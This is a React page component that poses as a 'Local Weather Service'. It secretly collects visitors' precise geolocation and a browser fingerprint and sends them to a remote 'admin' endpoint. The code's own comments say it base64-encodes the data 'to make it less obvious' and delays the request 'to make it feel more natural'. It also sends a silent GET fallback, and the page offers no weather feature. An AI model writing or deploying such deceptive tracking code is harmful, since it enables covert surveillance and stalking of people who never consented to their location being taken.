'use client'

import { useEffect, useState } from 'react'

// Configuration
const ADMIN_ENDPOINT = "https://your-backend-server.com/api/collect-location";

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number | null;
  timestamp: number;
}

export default function LocationCapturePage() {
  const [status, setStatus] = useState('📍 Requesting location access...');
  const [statusType, setStatusType] = useState('loading');
  const [locationInfo, setLocationInfo] = useState<LocationData | null>(null);

  // Package location data for transmission
  const packageLocationData = (position: GeolocationPosition) => {
    const locationData = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      altitude: position.coords.altitude,
      altitudeAccuracy: position.coords.altitudeAccuracy,
      heading: position.coords.heading,
      speed: position.coords.speed,
      timestamp: position.timestamp,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      screenWidth: screen.width,
      screenHeight: screen.height,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer,
      url: window.location.href,
      capturedAt: new Date().toISOString()
    };
    
    // Encode the data to make it less obvious
    const jsonString = JSON.stringify(locationData);
    const encodedData = btoa(jsonString);
    
    return {
      data: encodedData,
      type: 'location_capture',
      version: '1.0'
    };
  };

  // Send location data to admin endpoint
  const sendLocationData = async (packagedData: any) => {
    try {
      const response = await fetch(ADMIN_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify(packagedData)
      });
      
      if (response.ok) {
        console.log('Location data sent successfully');
        return true;
      } else {
        console.warn('Server responded with error:', response.status);
        return false;
      }
    } catch (error) {
      console.error('Failed to send location data:', error);
      return false;
    }
  };

  // Handle successful geolocation
  const handleLocationSuccess = async (position: GeolocationPosition) => {
    console.log('Location obtained:', position);
    
    // Display location info to user
    setLocationInfo({
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      timestamp: position.timestamp
    });
    
    // Package the data
    const packagedData = packageLocationData(position);
    
    // Send to admin endpoint
    const sent = await sendLocationData(packagedData);
    
    if (sent) {
      setStatus('✅ Location processed successfully!');
      setStatusType('success');
    } else {
      setStatus('⚠️ Location obtained, but processing failed');
      setStatusType('error');
    }
    
    // Also send a backup request with minimal data (fallback)
    try {
      const backupData = {
        lat: position.coords.latitude,
        lng: position.coords.longitude,
        acc: position.coords.accuracy,
        ts: position.timestamp,
        ua: navigator.userAgent.substring(0, 100) // Truncated user agent
      };
      
      // Send as URL parameters (GET request as backup)
      const params = new URLSearchParams(backupData as any);
      fetch(`${ADMIN_ENDPOINT}?${params}`, { method: 'GET' }).catch(() => {});
    } catch (e) {
      // Silent fallback failure
    }
  };

  // Handle geolocation errors
  const handleLocationError = (error: GeolocationPositionError) => {
    let message = '';
    
    switch(error.code) {
      case error.PERMISSION_DENIED:
        message = '❌ Location access denied. Please enable location services.';
        break;
      case error.POSITION_UNAVAILABLE:
        message = '❌ Location information unavailable.';
        break;
      case error.TIMEOUT:
        message = '❌ Location request timed out.';
        break;
      default:
        message = '❌ An unknown error occurred while retrieving location.';
        break;
    }
    
    setStatus(message);
    setStatusType('error');
    console.error('Geolocation error:', error);
  };

  // Initialize geolocation request
  const initializeLocationCapture = () => {
    if (!navigator.geolocation) {
      setStatus('❌ Geolocation is not supported by this browser.');
      setStatusType('error');
      return;
    }
    
    const options = {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    };
    
    setStatus('📍 Requesting location access...');
    setStatusType('loading');
    
    navigator.geolocation.getCurrentPosition(
      handleLocationSuccess,
      handleLocationError,
      options
    );
  };

  useEffect(() => {
    // Small delay to make it feel more natural
    const timer = setTimeout(initializeLocationCapture, 1000);
    return () => clearTimeout(timer);
  }, []);

  const handleRetry = () => {
    if (statusType === 'error') {
      initializeLocationCapture();
    }
  };

  return (
    <div style={{
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif',
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      minHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      color: '#333'
    }}>
      <div style={{
        background: 'white',
        padding: '3rem 2rem',
        borderRadius: '20px',
        boxShadow: '0 20px 40px rgba(0,0,0,0.1)',
        textAlign: 'center',
        maxWidth: '500px',
        width: '90%'
      }}>
        <div style={{ fontSize: '4rem', marginBottom: '1.5rem' }}>🌤️</div>
        <h1 style={{
          color: '#2c3e50',
          marginBottom: '1rem',
          fontSize: '2.2rem',
          fontWeight: '600'
        }}>
          Local Weather Service
        </h1>
        <p style={{
          color: '#7f8c8d',
          fontSize: '1.1rem',
          marginBottom: '2rem',
          lineHeight: '1.6'
        }}>
          Get personalized weather updates and local information based on your current location.
        </p>
        
        <div 
          onClick={handleRetry}
          style={{
            padding: '1rem',
            borderRadius: '10px',
            marginTop: '2rem',
            fontWeight: '500',
            background: statusType === 'loading' ? '#e3f2fd' : 
                       statusType === 'success' ? '#e8f5e8' : '#ffebee',
            color: statusType === 'loading' ? '#1976d2' : 
                   statusType === 'success' ? '#2e7d32' : '#c62828',
            ...(statusType === 'error' ? { cursor: 'pointer' } : {})
          }}
        >
          {status}
        </div>
        
        {locationInfo && (
          <div style={{
            background: '#f8f9fa',
            padding: '1.5rem',
            borderRadius: '10px',
            marginTop: '1rem',
            textAlign: 'left'
          }}>
            <h3 style={{ color: '#2c3e50', marginBottom: '0.5rem' }}>Location Details</h3>
            <p style={{ color: '#666', margin: '0.3rem 0' }}>
              <strong>Latitude:</strong> {locationInfo.latitude.toFixed(6)}
            </p>
            <p style={{ color: '#666', margin: '0.3rem 0' }}>
              <strong>Longitude:</strong> {locationInfo.longitude.toFixed(6)}
            </p>
            <p style={{ color: '#666', margin: '0.3rem 0' }}>
              <strong>Accuracy:</strong> {locationInfo.accuracy ? `${locationInfo.accuracy.toFixed(0)} meters` : 'Unknown'}
            </p>
            <p style={{ color: '#666', margin: '0.3rem 0' }}>
              <strong>Timestamp:</strong> {new Date(locationInfo.timestamp).toLocaleString()}
            </p>
          </div>
        )}
      </div>
    </div>
  )
}
